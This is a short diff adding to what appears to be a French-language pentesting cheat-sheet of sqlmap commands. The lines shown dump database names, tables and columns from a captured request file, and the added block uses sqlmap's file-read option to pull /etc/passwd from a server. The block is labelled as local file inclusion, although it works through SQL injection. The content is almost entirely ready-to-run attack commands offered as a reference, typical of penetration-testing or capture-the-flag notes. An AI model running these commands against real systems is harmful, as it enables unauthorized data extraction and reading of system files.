@@ -20,3 +20,8 @@ sqlmap -r req.txt -D <NOM_DB> -T <NOM_TABLE> --dump
 sqlmap -r req.txt -D <NOM_DB> -T <NOM_TABLE> -C <col1>,<col2>,<col3> --dump
 
 ```
+
+```bash 
+# Exploiter le LFI (Local File Inclusion)
+sqlmap -r trick.req --file-read=/etc/passwd --batch 
+```
